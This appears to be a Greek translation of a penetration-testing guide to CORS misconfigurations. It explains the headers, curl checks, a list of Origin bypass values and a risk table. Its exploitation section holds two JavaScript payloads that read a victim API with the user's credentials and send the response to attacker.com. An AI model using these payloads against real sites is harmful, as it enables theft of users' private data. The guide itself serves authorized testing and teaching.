# 🌍 Οδηγός λανθασμένων ρυθμίσεων CORS

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Ελεγχόμενη ανάγνωση πόρων μεταξύ origins (CORS)
```

---

## Πριν ξεκινήσετε

Το **CORS** είναι μηχανισμός του browser που ελέγχει την ανάγνωση αποκρίσεων μεταξύ διαφορετικών origins. **Origin** είναι ο συνδυασμός πρωτοκόλλου, hostname και θύρας. **Credentials** είναι στοιχεία όπως cookies, HTTP authentication και πιστοποιητικά πελάτη, ανάλογα με το αίτημα.

**ACAO** είναι η κεφαλίδα Access-Control-Allow-Origin και **ACAC** η Access-Control-Allow-Credentials. Η παρουσία τους δεν αρκεί για εύρημα: χρειάζεται να αποδεικνύεται μη επιτρεπόμενη ανάγνωση ευαίσθητων δεδομένων από πραγματικό browser.

Οι παρακάτω δοκιμές αφορούν εργαστήρια ή στόχους που περιλαμβάνονται ρητά σε εγκεκριμένο έλεγχο. Οι διευθύνσεις, τα διαπιστευτήρια και τα αναγνωριστικά είναι ενδεικτικά. Οι εντολές και τα payloads διατηρούνται από το αγγλικό πρωτότυπο· δεν εκτελούνται κατά τη μετάφραση.

<a id="section-01"></a>

## 🎯 Τι είναι το CORS

**CORS** καθορίζει πότε ο browser επιτρέπει σε ένα origin να διαβάσει απόκριση άλλου origin. Λανθασμένες ρυθμίσεις μπορεί να εκθέσουν ευαίσθητα δεδομένα μεταξύ ιστοτόπων.

---

<a id="section-02"></a>

## 🔍 Έλεγχοι CORS

### Βασικός έλεγχος

> **Το curl δεν εφαρμόζει το μοντέλο ασφάλειας του browser:** Η εμφάνιση κεφαλίδων δεν αποδεικνύει ότι άλλο site μπορεί να διαβάσει το περιεχόμενο. Το -I κάνει HEAD, που μπορεί να διαφέρει από GET. Επιβεβαιώστε το πραγματικό αίτημα και τη συνεδρία στον browser.

```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Έλεγχος κεφαλίδων απόκρισης:
Access-Control-Allow-Origin: https://evil.com  # Ένδειξη προς διερεύνηση, όχι αυτόματη επιβεβαίωση
Access-Control-Allow-Credentials: true         # Χρειάζεται έλεγχος ανάγνωσης με credentials
```

### Δοκιμαστικές τιμές κεφαλίδας Origin
```
# Έλεγχος αντιστοίχισης επιτρεπόμενου origin
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# Origin null
null

# Υποτομέας
https://sub.target.com

# Αλλαγή σε μη κρυπτογραφημένο πρωτόκολλο
http://target.com
```

---

<a id="section-03"></a>

## 💉 Εκμετάλλευση ευπαθειών

> **Δείγματα τεκμηρίωσης:** Οι εξωτερικοί προορισμοί αποστολής δεδομένων είναι παραδείγματα του πρωτοτύπου. Σε εργαστήριο χρησιμοποιήστε συνθετικά δεδομένα και δικό σας endpoint. Η απόκριση πρέπει να είναι αναγνώσιμη από browser· η απλή αποστολή αιτήματος δεν αρκεί και το CORS δεν αντικαθιστά προστασία CSRF.


### Παράδειγμα ανάγνωσης δεδομένων με credentials
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Αποστολή δεδομένων στον εξωτερικό server του παραδείγματος
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

### Παραλλαγή με Fetch API
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

<a id="section-04"></a>

## 📊 Πίνακας ενδεικτικών ρυθμίσεων

> **Ο πίνακας δεν αποδίδει αυτόματα σοβαρότητα:** Wildcard ACAO με credentials include δεν επιτρέπει credentialed ανάγνωση από browser. Αντανάκλαση origin ή null χρειάζεται πρακτική επαλήθευση με ευαίσθητα δεδομένα, συνεδρία και περιορισμούς cookies. Δείτε το [Fetch Standard για CORS και credentials](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials).


| Κεφαλίδα ACAO | ACAC | Κίνδυνος |
| ------------- | ------ | ------ |
| `*` | false — ψευδές | Εξαρτάται από την ευαισθησία δεδομένων, χωρίς credentials |
| `*` | true — αληθές | Δεν επιτρέπει credentialed ανάγνωση με wildcard |
| Origin που ελέγχει ο ελεγκτής | true — αληθές | **Ενδεχομένως κρίσιμο, ανάλογα με τα δεδομένα και τη δυνατότητα εκμετάλλευσης** |
| null | true — αληθές | **Ενδεχομένως υψηλό, με επιβεβαίωση αντίκτυπου** |
| Origin που αντιγράφεται από το αίτημα | true — αληθές | **Ενδεχομένως κρίσιμο, ανάλογα με τα δεδομένα και τη δυνατότητα εκμετάλλευσης** |

### Μοτίβα που χρειάζονται διερεύνηση
```http
# Αντιγραφή οποιουδήποτε origin
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# Επιτρέπεται το origin null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

<a id="section-05"></a>

## 🛠️ Σύντομοι έλεγχοι

```bash
# Αυτοματοποίηση με curl
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

<a id="section-06"></a>

## 📚 Πηγές

- [PortSwigger — CORS](https://portswigger.net/web-security/cors)
- [Παραδείγματα ελέγχων CORS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 Ελέγξτε τις ρυθμίσεις CORS!</b><br>
  <i>Μόνο για εξουσιοδοτημένους ελέγχους!</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
